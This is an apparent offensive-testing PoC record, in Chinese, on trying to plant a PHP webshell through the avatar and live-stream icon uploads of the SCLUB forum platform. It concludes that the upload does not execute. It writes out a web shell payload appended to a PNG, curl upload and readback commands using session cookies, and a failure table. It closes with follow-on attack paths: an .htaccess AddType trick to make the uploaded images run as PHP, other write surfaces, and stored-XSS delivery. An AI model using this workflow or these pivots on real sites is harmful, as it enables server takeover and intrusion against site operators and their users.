# SCLUB/168six up_photo·a_photo 头像与直播台图标上传：.php 文件名被丢弃、GD 重编码裁掉 PHP 尾 → 上传不执行

- **code**: sclub-168six-up_photo-a_photo-头像与直播台图标上传-.php-文件名被丢弃-gd-重编码裁
- **kind**: poc
- **category**: file-upload
- **component**: SCLUB 免費論壇平台（Apache 2.2.3 / PHP 5.1.6，会员头像 + 直播台图标上传）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-02 在 168six 站群源站 192.0.2.11 实测（finding#1215，finding_checks=verified）：会员会话下 up_photo 与 a_photo 两处都接受「200x200 真 PNG + 尾部 <?php system($_GET[c]) ?> + filename=a1.php」，均返回 200「上傳完成」，但页面 IMG SRC 虽硬编码 .php（/U/50/188350/1-135x135.php?4862、/A/188350/1-135x135.php?7440），GET 该 .php 均 404（body: The requested URL /cgi-bin/ad.cgi/U/50/188350/1-135x135.php was not found）；同路径换 .png 得 200 / image/png / 290B / 字节以 IEND 结束（PHP 尾已丢）。公开列表 ?PUT=a_show&TYPE=A 实见 /A/88609/1-200x200.png、/A/91861/1-200x200.jpg、/A/61443/1-200x200.JPG，证明落盘名=1-<w>x<h>.<真实图片扩展名>，上传文件名被丢弃。故判「上传成功但不可执行」成立。
- **path**: pocs/sclub-168six-up_photo-a_photo-头像与直播台图标上传-.php-文件名被丢弃-gd-重编码裁/sclub_168six_upload_php_not_exec.md
- **tags**: sclub,168six,头像上传,up_photo,a_photo,file-upload,gd重编码,扩展名丢弃,不可执行,php
- **created_at**: 2026-11-02T09:32:37.746Z
- **engine**: 192.0.2.11（target74.example.com 源站）

## 描述

SCLUB 免费论坛的会员头像（?PUT=up_photo）与直播台图标（?PUT=a_photo）两个上传点：只按图片内容校验、用 GD 重编码并按真实图片格式落盘，上传文件名里的 .php 被丢弃。页面 IMG SRC 硬编码 .php 而实际文件是 .png，回读 404。前提：有效会员会话 + 200x200 真图片 + 尾部 PHP 代码。用途：判定该平台上传面能否直接拿 webshell（答案是不能），避免重复投入。

## 用法

```
1) 以会员会话（Cookie: PHPSESSID=<REDACTED>）访问 /index.phtml?PUT=up_photo 取表单；a_photo 需先 POST /index.phtml?PUT=a_edit 建直播台拿到 AID。
2) 造图：200x200 真 PNG，尾部追加 `<?php system($_GET[c]); ?>`（用 cat 拼到 a1.png 后改名为 a1.php）。
3) 上传（字段名以页面表单为准，唯一要点是 filename=a1.php）：
   curl -b 'PHPSESSID=<REDACTED>' -F 'PUT=up_photo' -F 'PHOTO=@a1.php;filename=a1.php;type=image/png' http://TARGET/index.phtml
   # a_photo：-F 'PUT=a_photo' -F 'AID=<aid>' -F 'FID=0' -F 'APHOTO=@a1.php;filename=a1.php'
4) 判据：200「上傳完成」只说明写入成功；必须回读。拿页面 IMG SRC 的 .php 地址 GET → 404 且同路径 .png → 200 image/png 即判定不可执行。
纯静态回读上限：不要在此平台继续试 .php/.phtml/.php5 变形，文件名根本不参与落盘命名。
```

## 正文

```
# 结论（先看这条，省一轮）

SCLUB 免费论坛（168six 站群，源站 192.0.2.11，Apache 2.2.3 + PHP 5.1.6）的两个会员上传点
`?PUT=up_photo`（头像）与 `?PUT=a_photo`（直播台图标）：

- 接受 multipart 上传，接受 `filename=a1.php`，一律回 `200` +「上傳完成」；
- 但**上传文件名被完全丢弃**，服务端用 GD 校验并重编码，落盘名固定为
  `1-<宽>x<高>.<图片真实扩展名>`（如 `1-135x135.png`、`1-200x200.jpg`、`1-200x200.JPG`）；
- 页面 HTML 里的 IMG SRC 硬编码 `.php`（历史遗留），与实际盘上文件不一致；
- 重编码把文件尾部的 `<?php ... ?>` 一起裁掉，就算扩展名对也没有 PHP 代码可执行。

**单靠上传这条路拿不到 webshell。** 想要执行只能配合可控的 `.htaccess`（AddType）或另找不重编码的写面。

# 前置条件

- 任意有效会员会话（Cookie: `PHPSESSID=<REDACTED>`），账号可用本任务建立的测试会员 `<REDACTED>`
- 一张 GD 能解析的**真图片**（200x200 PNG 最稳）
- PHP 尾巴拼在图片字节之后，只影响内容、不影响文件名

# 复现

## 1) 造载荷

```bash
# 200x200 真 PNG（ImageMagick / 任意工具），尾部追加 PHP
convert -size 200x200 xc:white a1.png 2>/dev/null || cp base200.png a1.png
printf '<?php system($_GET[c]); ?>' >> a1.png
cp a1.png a1.php      # 只是借用文件名，服务端不认
```

## 2) 头像点 up_photo

```bash
# 取页面（会直接回显当前头像的 IMG SRC，形如 /U/50/<uid>/1-135x135.php?<rand>）
curl -s -b "PHPSESSID=$S" "http://TARGET/index.phtml?PUT=up_photo"

# 上传
curl -s -b "PHPSESSID=$S" \
  -F 'PUT=up_photo' \
  -F 'PHOTO=@a1.php;filename=a1.php;type=image/png' \
  "http://TARGET/index.phtml"
# => 200，正文含「上傳完成」，页面 IMG SRC 变成新的 /U/50/<uid>/1-135x135.php?<rand>
```

## 3) 直播台点 a_photo（多一步）

```bash
# 必须先建/设定直播台，否则没有 AID
curl -s -b "PHPSESSID=$S" -X POST -d 'PUT=a_edit' "http://TARGET/index.phtml"
# 上传（AID = 自己的直播台 id）
curl -s -b "PHPSESSID=$S" \
  -F 'PUT=a_photo' -F 'AID=188350' -F 'FID=0' \
  -F 'APHOTO=@a1.php;filename=a1.php;type=image/png' \
  "http://TARGET/index.phtml"
```

## 4) 回读判据（关键，别跳）

```bash
# 页面给的 .php 地址 -> 404
curl -s -o /dev/null -w '%{http_code}\n' "http://TARGET/U/50/188350/1-135x135.php?4862"
# 404，body: The requested URL /cgi-bin/ad.cgi/U/50/188350/1-135x135.php was not found

# 同路径换 .png -> 200 image/png，长度很小，字节以 IEND 结束
curl -s -D- -o out.png "http://TARGET/U/50/188350/1-135x135.png" | head -5
tail -c 8 out.png | xxd        # ... ae 42 60 82 = IEND，PHP 尾没了
# 打 /U/...png?c=id 也不会执行，只是静态
```

# 旁证：命名规则（a_photo 公开列表）

```bash
curl -s "http://TARGET/index.phtml?PUT=a_show&TYPE=A" | grep -oE '/A/[0-9]+/[^"]+'
# 实见：/A/88609/1-200x200.png  /A/91861/1-200x200.jpg  /A/61443/1-200x200.JPG
```
→ 落盘名 = `1-<w>x<h>.<真实扩展名>`，与上传的 filename、与页面显示的 `.php` 都无关。

# 常见失败原因

| 现象 | 原因 |
|---|---|
| 上传后图片不更新 / 报错 | 传的是纯 PHP 文本、GD 解析不了，必须真图片 |
| a_photo 无 AID、无落点 | 没先 `POST ?PUT=a_edit` 建直播台 |
| 以为成功：看到 200「上傳完成」就收工 | 成功只代表写入，必须回读 .php 判 404 |
| 把 404 里的 `/cgi-bin/ad.cgi/...` 当真实盘路径 | 那是 Apache 错误页拼接的前缀，不是 docroot 相对路径 |
| 继续试 a1.phtml / a1.php5 / 双扩展 | 无意义，扩展名由服务端按图片真实格式决定 |

# 后续可走的方向

1. 找能写 `.htaccess` 的入口（根目录或 `/U`、`/A` 子目录），`AddType application/x-httpd-php .png` 即可让上述已上传文件直接执行；
2. 换不重编码/保留原名的写面（后台模板、附件、备份还原等）；
3. 退化利用：`image/png` 静默 + 同源，可做存储型 XSS 投递（若有页面按扩展名/Content-Type 渲染）。

```
